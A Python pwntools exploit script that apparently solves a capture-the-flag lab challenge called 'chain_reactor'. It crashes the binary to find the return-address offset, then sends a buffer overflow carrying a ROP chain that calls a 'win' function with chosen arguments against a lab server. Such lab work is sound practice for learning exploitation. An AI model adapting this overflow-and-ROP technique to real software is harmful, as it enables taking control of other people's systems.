#!/usr/bin/env python3
from pwn import *

ADDR = "offsec.m0lecon.it"
port = 13565

context.binary = elf = ELF('/home/kali/Desktop/offsec/labs/lab8/challenges/02_chain_reactor/chain_reactor', checksec=False)
context.arch = 'amd64'

def conn():
    if args.LOCAL:
        r = process(elf.path)
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote(ADDR, port)

    return r

def get_ret_offset():
    # Start a dummy process to crash
    p_crash = process(elf.path)
    
    p_crash.recvuntil(b'codes: ')
    p_crash.sendline(cyclic(200))
    p_crash.wait()
    
    # Grab the core dump generated by the crash
    core = p_crash.corefile

    crash_value = core.read(core.rsp, 4)
    
    offset = cyclic_find(crash_value)
    print(f"Calculated offset to RIP: {offset}")
    return offset

OFFSET_TO_RIP = get_ret_offset()

rop = ROP(elf)      # no PIE so it's fixed like plt and got addr
ret_gadget = rop.find_gadget(['ret'])[0]
log.info(f"Found 'ret' gadget at: {hex(ret_gadget)}")

pop_rdi_ret_addr = rop.find_gadget(['pop rdi', 'ret'])[0]
log.info(f"Found helper gadget 'pop_rdi_ret' function at: {hex(pop_rdi_ret_addr)}")

pop_rsi_ret_addr = rop.find_gadget(['pop rsi', 'ret'])[0]
log.info(f"Found helper gadget 'pop_rsi_ret' function at: {hex(pop_rsi_ret_addr)}")

a = 0xc0ffee
b = 0xbadc0de

r=conn()

payload = flat(
    b'A' * OFFSET_TO_RIP,
    p64(ret_gadget),
    p64(pop_rdi_ret_addr), p64(a),
    p64(pop_rsi_ret_addr), p64(b),
    p64(elf.sym.win),
)

r.recvuntil(b'codes: ')
r.send(payload)
r.interactive()
